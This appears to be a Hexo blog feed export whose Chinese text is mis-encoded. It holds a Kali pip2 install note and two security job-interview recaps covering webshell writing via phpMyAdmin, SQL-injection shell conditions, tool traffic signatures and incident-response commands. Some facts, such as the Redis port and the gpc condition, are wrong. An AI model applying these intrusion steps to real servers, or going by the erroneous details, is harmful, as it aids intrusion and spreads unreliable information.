    <content><![CDATA[<p><code>kali å®‰è£…pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>å‡çº§ç‰ˆæœ¬<br><code>sudo pip2 install --upgrade pip</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡hwé¢è¯•ç»å†(2)</title>
    <url>/posts/e9000575/</url>
    <content><![CDATA[<h3 id="ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ"><a href="#ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ" class="headerlink" title="ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ"></a>ç°åœ¨æ˜¯ä¸æ˜¯ä¸Šå¤§å­¦ï¼Œ4æœˆä»½æ˜¯å¦æœ‰æ—¶é—´ï¼Œ</h3><p>ç­”: ç°åœ¨å¤§ä¸‰åœ¨è¯»ï¼Œ4æœˆä»½æœ‰æ—¶é—´å¯ä»¥å‡ºæ¥</p>
<h3 id="ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†"><a href="#ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†" class="headerlink" title="ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†"></a>ä»‹ç»ä¸‹ç®€å†é‡Œçš„ç»å†</h3><p>ç­”: é’“é±¼çš„æœåŠ¡å™¨ä¹‹å‰åœ¨qqç¾¤é‡Œçœ‹åˆ°è¿‡ï¼Œè¿›è¡Œä¿¡æ¯æœé›†æ‰«åˆ°phpmyadmin ç„¶åçˆ†ç ´<span id="more"></span>ä¹‹åå¼€å¯å†™å…¥æ—¥å¿—çš„è®¾ç½® å†™å…¥webshell<br>ç„¶åå°±è¯´äº†ä¸‹é‚£æ¬¡å›¾ä¹¦é¦†çš„ä¸€æ¬¡ä¸å®Œæ•´çš„æº¯æºç»å†ï¼Œæ—¶é—´æœ‰äº›ä¹…äº†è®°å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè€Œä¸”é‚£æ—¶å€™ç¬¬ä¸€æ¬¡æ¥è§¦è¿™ä¸ªï¼Œä¸»è¦æœ‰ä¸¤ä¸ªç°è±¡ï¼Œä¸€æ˜¯æ­£å¸¸ç™»é™†æ—¶ä¼šè¢«æ³¨é”€ï¼ŒäºŒæ˜¯mysqlæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚<br>ç”±äºç³»ç»Ÿæ˜¯window2008 ä¸”ä½¿ç”¨çš„phpstudyè‡ªè¡Œæ­å»ºçš„ ä¹‹å‰æœ‰è¿‡è¢«å…¥ä¾µçš„è®°å½•ï¼Œä¹Ÿå­˜åœ¨ç€ä¸€äº›è¢«éæ³•æ·»åŠ çš„è´¦å·ï¼Œç„¶åå°±åœ¨æ³¨å†Œè¡¨ä¸­åˆ é™¤äº†ä¸€ç³»åˆ—çš„è´¦æˆ·ï¼Œ<br>åœ¨msconfigä¸­å¼€å¯äº†mysqlæœåŠ¡ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•æ­£å¸¸ç™»é™†ã€‚<br>netstat -anoçœ‹äº†ä¸‹å¼€å¯çš„ç«¯å£ï¼Œå‘ç°å¼€å¯äº†80 Apache 808 iis 135ç«¯å£ã€‚<br>æŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨å»çœ‹ä¸€äº›å¼‚å¸¸<br>id<br>4624 è´¦å·ç™»é™†æˆåŠŸ<br>4625 è´¦å·ç™»é™†å¤±è´¥<br>4720 åˆ›å»ºè´¦å·<br>4726 åˆ é™¤è´¦å·</p>
<h3 id="æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ"><a href="#æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ" class="headerlink" title="æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ"></a>æœ‰æ²¡æœ‰è¿‡ç›¸å…³çš„æŠ¤ç½‘ç»éªŒ</h3><p>ç­”: æ²¡æœ‰è¿‡hwç»éªŒï¼Œä½†æ˜¯æˆ‘ä¼šå»å­¦ä¹ å»äº†è§£</p>
<h3 id="æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“"><a href="#æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“" class="headerlink" title="æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“"></a>æ˜¯å¦æœ‰ä½¿ç”¨è¿‡å®‰å…¨äº§å“</h3><p>ç­”: åªæ¥è§¦è¿‡Dç›¾ï¼Œåˆ«çš„è®¾å¤‡æ²¡æ¥è§¦è¿‡</p>
<h3 id="è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´"><a href="#è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´" class="headerlink" title="è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´"></a>è¯´ä¸€ä¸‹å¸¸è§çš„ç«¯å£å’Œæ¼æ´</h3><p>ç­”:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redisæœªæˆæƒè®¿<br>7001 weblogic ååºåˆ—åŒ–<br>445 æ°¸æ’ä¹‹è“</p>
<h3 id="è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾"><a href="#è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾" class="headerlink" title="è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾"></a>è¯´ä¸€ä¸‹å¸¸ç”¨çš„å®‰å…¨å·¥å…·çš„æµé‡ç‰¹å¾</h3><p>ç­”:<br>awvsçš„åœ¨header url body ä¸‰é¡¹ä¸­éƒ½ä¼šæœ‰a%#-wvs<br>sqlmapçš„ ä¼šåœ¨uaæ˜¾ç¤ºsqlmapçº§ç‰ˆæœ¬å· å’Œ sqlmapç½‘å€<br>appscan url headerå’Œbkdyä¸­éƒ½ä¼šæœ‰appscan<br>ç„¶åè¯´äº†ä¸‹èœåˆ€å¤§å¤šä½¿ç”¨base64ç¼–ç ï¼Œevalå’Œassertä¼šè¢«éš”å¼€</p>
<h3 id="è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾"><a href="#è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾" class="headerlink" title="è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾"></a>è¯´ä¸€ä¸‹å†°èçš„æµé‡ç‰¹å¾</h3><p>ç­”: è¿™ä¸ªæœ‰ç‚¹ä¸è®°å¾—äº†<br>æ³¨:(å†°è<br>1.content-typeä¸€å®šä¸ºapplication/octet-stream<br>2.å†…ç½®17ä¸ªUA Mozilla4/5<br>3.payloadå®šé•¿ä¸”æ— éšæœºå¡«å……éƒ¨åˆ†(padding)<br>)</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoé˜…è¯»å…¨æ–‡è®¾ç½®</title>
    <url>/posts/5605128/</url>
    <content><![CDATA[<p>ä½¿ç”¨<code>&lt; !--more--&gt;</code>æ ‡ç­¾æ‰‹åŠ¨æˆªæ–­ æˆ–è€…<br>æ–‡ä»¶å¤¹ä¸‹çš„scaffoldsæ–‡ä»¶å¤¹ä¸­çš„post.mdä¸­æ·»åŠ ä¸€è¡Œ<code>description:&quot; &quot;</code> å³å¯åœ¨è¾“å…¥<code>hexo new post </code>åšå®¢æ ‡é¢˜å‘½ä»¤æ–°å»º.mdæ–‡ä»¶æ—¶è‡ªåŠ¨åŠ ä¸Š<code>description:&#39; &#39;</code> åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºé˜…è¯»å…¨æ–‡æŒ‰é’®ä¸”ä¸å¸¦æ‘˜è¦ã€‚</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡hwé¢è¯•ç»å†(1)</title>
    <url>/posts/40769f33/</url>
    <content><![CDATA[<h1 id="ä¸€é¢"><a href="#ä¸€é¢" class="headerlink" title="ä¸€é¢:"></a>ä¸€é¢:</h1><h3 id="å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„"><a href="#å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„" class="headerlink" title="å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„"></a>å¦‚ä½•æ¥è§¦ç½‘ç»œå®‰å…¨çš„</h3><p>ç­”ï¼šåœ¨å¤§ä¸€æ—¶å¼€å§‹æ¥è§¦CTFï¼Œé‚£æ—¶å€™å¼€å§‹æ­£å¼æ¥è§¦å®‰å…¨ï¼Œç„¶ååé¢ä¸»è¦æ˜¯å­¦ä¹ çš„webå®‰å…¨ï¼Œç»å¸¸ä¼šçœ‹å…ˆçŸ¥ç¤¾åŒºï¼Œfreebufï¼Œcsdnå’Œä¹Œäº‘<span id="more"></span>ä¹‹ç±»çš„ç¤¾åŒºæ–‡ç« å­¦ä¹ </p>
<h3 id="æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡"><a href="#æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡" class="headerlink" title="æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡"></a>æœ‰æ— æ¥è§¦è¿‡å®‰å…¨è®¾å¤‡</h3><p>ç­”ï¼šæ²¡æ¥è§¦è¿‡ã€‚</p>
<h3 id="æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨"><a href="#æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨" class="headerlink" title="æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨"></a>æ˜¯å¦ç†Ÿæ‚‰windowsæˆ–è€…linuxå‘½ä»¤çš„ä½¿ç”¨</h3><p>ç­”ï¼šä¹‹å‰æœ‰å­¦ä¹ è¿‡Linuxï¼Œå¯¹äºLinuxå’ŒWindowsçš„åŸºæœ¬å‘½ä»¤æ“ä½œ<!--more-->éƒ½å¯ä»¥ç†Ÿæ‚‰ä½¿ç”¨ã€‚&lt; !â€“moreâ€“&gt;</p>
<h3 id="è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†"><a href="#è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†" class="headerlink" title="è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†"></a>è¯´ä¸€ä¸‹å¦‚ä½•è¿›è¡Œä¿¡æ¯æ”¶é›†</h3><p>ç­”ï¼šç•¥</p>
<h3 id="sqlæ³¨å…¥å†™shellçš„æ¡ä»¶"><a href="#sqlæ³¨å…¥å†™shellçš„æ¡ä»¶" class="headerlink" title="sqlæ³¨å…¥å†™shellçš„æ¡ä»¶"></a>sqlæ³¨å…¥å†™shellçš„æ¡ä»¶</h3><p>ç­”ï¼š<br>1.æ‹¥æœ‰rootæƒé™<br>2.çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„<br>3.å¼€å¯PHPçš„å…¨å±€gpc<br>4 åœ¨å†™å…¥çš„ç›®å½•ä¸‹æœ‰å†™å…¥æƒé™</p>
<h3 id="xssçš„é˜²å¾¡"><a href="#xssçš„é˜²å¾¡" class="headerlink" title="xssçš„é˜²å¾¡"></a>xssçš„é˜²å¾¡</h3><p>ç­”ï¼š1.è¿›è¡Œå®ä½“ç¼–ç <br>       2.å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤</p>
<h3 id="è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨"><a href="#è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨" class="headerlink" title="è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨"></a>è¯´ä¸€ä¸‹ssrfçš„åŸç†åŠåˆ©ç”¨</h3><p>ç­”ï¼šssrfæ˜¯ä¸€ä¸ªæ”»å‡»è€…æ„é€ å½¢æˆä»æœåŠ¡å™¨ç«¯å‘èµ·çš„å®‰å…¨æ¼æ´ï¼Œä¸€èˆ¬åœ¨æœåŠ¡å™¨è·å–å›¾ç‰‡ï¼Œæ–‡æœ¬ä¹‹ç±»çš„åœ°æ–¹çœ‹åˆ°æœ‰å¼•ç”¨å…¶ä»–æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥å°è¯•ä¸€ä¸‹æ˜¯å¦æœ‰ssrfå­˜åœ¨<br>åˆ©ç”¨ï¼š<br>1.å¯ä»¥ç”¨æ¥å¯¹å†…ç½‘ç«¯å£æ‰«æ<br>2.è¿›è¡Œæ–‡ä»¶è¯»å–</p>
<h3 id="æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´"><a href="#æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´" class="headerlink" title="æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´"></a>æœ‰æ²¡æœ‰æ¥è§¦è¿‡shiroæ¼æ´</h3><p>ç­”ï¼šè®°ç€ä»¥å‰å¤ç°è¿‡shiroçš„ååºåˆ—åŒ–ï¼Œä¸»è¦æ˜¯åœ¨remembermeå¤„ï¼Œå…¶è§£æä¸ºremembermeçš„cookieå€¼â€“ base64â€“aesè§£å¯†â€“ååºåˆ—åŒ–</p>
<h3 id="æœ‰æ²¡æœ‰æº¯æºçš„ç»å†"><a href="#æœ‰æ²¡æœ‰æº¯æºçš„ç»å†" class="headerlink" title="æœ‰æ²¡æœ‰æº¯æºçš„ç»å†"></a>æœ‰æ²¡æœ‰æº¯æºçš„ç»å†</h3><p>ç­”ï¼šä¹‹å‰å­¦æ ¡å›¾ä¹¦é¦†æœ‰è¿‡ä¸€æ¬¡è¢«å…¥ä¾µçš„ç»å†ï¼Œå½“æ—¶å»çœ‹äº†ä¸€ä¸‹ï¼Œç”±äºç¬¬ä¸€æ¬¡æ¥è§¦å°±å­¦äº†ä¸‹ç›¸å…³å†…å®¹</p>
<h3 id="è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹"><a href="#è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹" class="headerlink" title="è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹"></a>è¯´ä¸€ä¸‹åº”æ€¥å“åº”çš„åŸºæœ¬æµç¨‹</h3><p>ç­”ï¼šå¯¹äºWindowsç«¯çš„åé—¨æ’é™¤</p>
<h4 id="å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess-explorerç­‰"><a href="#å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess-explorerç­‰" class="headerlink" title="å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess explorerç­‰"></a>å¯ä»¥ä½¿ç”¨ä¸€äº›å®‰å…¨å·¥å…·ï¼šdç›¾ï¼Œlogparserï¼Œautorunsï¼Œprocess explorerç­‰</h4><h4 id="é¡¹ç›®æ£€æŸ¥"><a href="#é¡¹ç›®æ£€æŸ¥" class="headerlink" title="é¡¹ç›®æ£€æŸ¥"></a>é¡¹ç›®æ£€æŸ¥</h4><p>æ³¨å†Œè¡¨å¯åŠ¨é¡¹<br>ç½‘ç»œè¿æ¥<br>æ¶æ„è¿›ç¨‹<br>ç³»ç»ŸæœåŠ¡<br>è®¡åˆ’ä»»åŠ¡</p>
<h4 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><p>å¯ä»¥ä½¿ç”¨logparseræ ¼å¼åŒ–åè¿›è¡Œåˆ†æ<br>ä¹Ÿå¯ä»¥ä½¿ç”¨Windowsçš„äº‹ä»¶æŸ¥çœ‹å™¨è¿›è¡Œåˆ†æ</p>
<h4 id="æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨"><a href="#æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨" class="headerlink" title="æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨"></a>æ£€æŸ¥æ˜¯å¦å­˜åœ¨shiftç²˜æ»é”®åé—¨</h4><p>å¯¹äºLinuxç«¯<br>1.æŸ¥çœ‹å¼‚å¸¸è´¦å·        cat /etc/passwd<br>2.æŸ¥çœ‹è¿›ç¨‹              ps -ef ä¸¨more<br>3.æŸ¥çœ‹ç½‘ç»œè¿æ¥       netstat -anplt<br>4.è®¡åˆ’ä»»åŠ¡<br>5.ç³»ç»Ÿå¯åŠ¨é¡¹<br>6.ç³»ç»Ÿæ—¥å¿—</p>
<h4 id="å¯¹äºwebæœåŠ¡å™¨"><a href="#å¯¹äºwebæœåŠ¡å™¨" class="headerlink" title="å¯¹äºwebæœåŠ¡å™¨"></a>å¯¹äºwebæœåŠ¡å™¨</h4><p>å¯ä»¥æŸ¥çœ‹ä¸­é—´ä»¶é…ç½®å’Œç›¸å…³æ—¥å¿—<br>å½“ç„¶ä¹Ÿè¦è€ƒè™‘æµè§ˆå™¨åŠ«æŒé—®é¢˜<br>f12æŸ¥çœ‹ç½‘ç»œçš„åŠ è½½</p>
<h3 id="æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw"><a href="#æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw" class="headerlink" title="æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw"></a>æœ‰æ²¡æœ‰é¢è¯•è¿‡å…¶ä»–å…¬å¸çš„hw</h3><p>ç­”ï¼šæ²¡æœ‰</p>
<h3 id="æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘"><a href="#æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘" class="headerlink" title="æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘"></a>æœŸæœ›çš„è–ªèµ„æ˜¯å¤šå°‘</h3><p><em>é¢è¯•éš¾åº¦ï¼šæ˜“<br>é¢è¯•ç»“æœï¼šé€šè¿‡</em></p>
<h1 id="äºŒé¢"><a href="#äºŒé¢" class="headerlink" title="äºŒé¢:"></a>äºŒé¢:</h1><h3 id="ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ"><a href="#ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ" class="headerlink" title="ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ"></a>ä½ å¥½ï¼Œæˆ‘ä»¬æ˜¯xxxï¼Œè¯·é—®ä½ æ˜¯xxxå—ï¼Œç°åœ¨æ–¹ä¾¿å—ï¼Ÿ</h3><p>ç­”ï¼šæ‚¨å¥½ï¼Œæ˜¯çš„ï¼Œç°åœ¨æ–¹ä¾¿ï¼Œæ‚¨è®²ã€‚</p>
<h3 id="ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯"><a href="#ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯" class="headerlink" title="ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯"></a>ä½ å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æŠ¤ç½‘ï¼ŒæŠ¤ç½‘çš„èƒŒæ™¯</h3><p>ç­”ï¼šç•¥</p>
<h3 id="è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹"><a href="#è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹" class="headerlink" title="è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹"></a>è¯´ä¸€ä¸‹hwé˜²å®ˆæ–¹æµç¨‹</h3><p>ç­”ï¼šå‰æœŸéœ€è¦å¯¹èµ„äº§è¿›è¡Œæ¢³ç†ï¼Œæ’æŸ¥æš´éœ²é¢å’Œæ•æ„Ÿä¿¡æ¯ï¼Œä¸­æœŸè¦7*24hå€¼å®ˆï¼ŒåŠæ—¶å†™æ—¥æŠ¥å’Œå‘¨æŠ¥ï¼ŒåæœŸå°±éœ€è¦æ€»ç»“å’Œæ•´æ”¹</p>
<h3 id="ä½ è¯´ä¸€ä¸‹struct2-ç‰¹å¾"><a href="#ä½ è¯´ä¸€ä¸‹struct2-ç‰¹å¾" class="headerlink" title="ä½ è¯´ä¸€ä¸‹struct2 ç‰¹å¾"></a>ä½ è¯´ä¸€ä¸‹struct2 ç‰¹å¾</h3><p>ç­”ï¼šæ²¡æ€ä¹ˆäº†è§£è¿‡ï¼ŒåªçŸ¥é“æœ‰rceæ¼æ´ï¼ˆ.action .doï¼‰</p>
<h3 id="çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†"><a href="#çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†" class="headerlink" title="çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†"></a>çœ‹ä½ ç®€å†ä¸Šæœ‰è¿‡å›¾ä¹¦é¦†æº¯æºç»å†ï¼Œä½ ç®€å•è¯´ä¸€ä¸‹æº¯æºç»å†</h3><p>ç­”ï¼šå»å¹´æˆ‘ä»¬å­¦æ ¡å›¾ä¹¦é¦†åˆè¢«å…¥ä¾µè¿‡ï¼Œè€å¸ˆè®©æˆ‘ä»¬è¿‡å»çœ‹ä¸€ä¸‹ï¼Œå› ä¸ºå½“æ—¶æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œå°±å­¦ä¹ ä¸€ä¸‹</p>
<h3 id="ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶"><a href="#ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶" class="headerlink" title="ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶"></a>ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¼‚å¸¸äº‹ä»¶</h3><h3 id="é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ"><a href="#é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ"></a>é‚£ä½ è¯´ä¸€ä¸‹å¼‚å¸¸äº‹ä»¶æœ‰å“ªäº›ï¼Ÿ</h3><p>ç­”ï¼šè¿™ä¸ªä¸æ˜¯å¾ˆäº†è§£</p>
<h3 id="é‚£ä½ ç»§ç»­è¯´"><a href="#é‚£ä½ ç»§ç»­è¯´" class="headerlink" title="é‚£ä½ ç»§ç»­è¯´"></a>é‚£ä½ ç»§ç»­è¯´</h3><p>ç­”ï¼šå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹å¼€æ”¾çš„ç«¯å£ï¼Œå¹¶å…³é—­ä¸€äº›ä¸å¿…è¦çš„</p>
<h3 id="é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢"><a href="#é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢" class="headerlink" title="é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢"></a>é‚£ä½ ç”¨ä»€ä¹ˆæŸ¥çœ‹å‘¢</h3><p>ç­”ï¼šnetstat -anlpt</p>
<h3 id="é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢"><a href="#é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢" class="headerlink" title="é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢"></a>é‚£ä½ éƒ½å…³é—­äº†é‚£äº›ç«¯å£å‘¢</h3><p>ç­”ï¼šè¿™ä¸ªå¥½åƒä¸å¤ªè®°å¾—äº†ï¼Œå¥½åƒå…³é—­äº†3389ä¹‹ç±»çš„ï¼Œè¿˜å…³é—­äº†ä¸€ä¸ªæ•°æ®åº“çš„åº”è¯¥æ˜¯ï¼Œè®°ä¸æ¸…æ¥šäº†ï¼Œå› ä¸ºè¿™ä¸ªå›¾ä¹¦é¦†ç®¡ç†ç³»ç»Ÿæ˜¯è€å¸ˆè‡ªå·±ç”¨phpstudyæ­å»ºçš„ã€‚å½“æ—¶è¿˜æŸ¥çœ‹äº†ä¸€ä¸‹ç³»ç»Ÿè´¦å·å‘ç°æœ‰å‡ ä¸ªè¢«äººæ·»åŠ è¿‡çš„è´¦å·ï¼Œä¹Ÿå­˜åœ¨éšè—ç”¨æˆ·</p>
<h3 id="é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢"><a href="#é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢" class="headerlink" title="é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢"></a>é‚£ä½ è¯´ä¸€ä¸‹æ˜¯æ€ä¹ˆå‘ç°éšè—è´¦æˆ·çš„å‘¢</h3><p>ç­”ï¼šæˆ‘è®°ç€åœ¨æ³¨å†Œè¡¨çš„â€œsamâ€ï¼ˆå½“æ—¶è®°ä¸èµ·æ¥å…·ä½“å«ä»€ä¹ˆäº†ï¼‰ç„¶åå»æ‰¾æ˜¯å¦å­˜åœ¨éšè—è´¦å·</p>
<h3 id="é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ"><a href="#é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ" class="headerlink" title="é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ"></a>é‚£éšè—è´¦æˆ·æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ</h3><p>ç­”ï¼šéšè—è´¦æˆ·éƒ½ä¼šæœ‰~ï¼ˆå½“æ—¶å¿˜è®°äº†æ˜¯$ï¼Œç„¶åhrä¹Ÿæœ‰ç‚¹ç–‘é—®ï¼Œä½†å°±æ˜¯æ²¡æƒ³èµ·æ¥ï¼Œéšè—ç”¨æˆ·ç”¨$ç¬¦ï¼Œå½“æ—¶å›ç­”æ—¶é”™è¯´æˆäº†~éšè—ç”¨æˆ·<br>æŸ¥çœ‹æ³¨å†Œè¡¨ samä¸‹ domains account 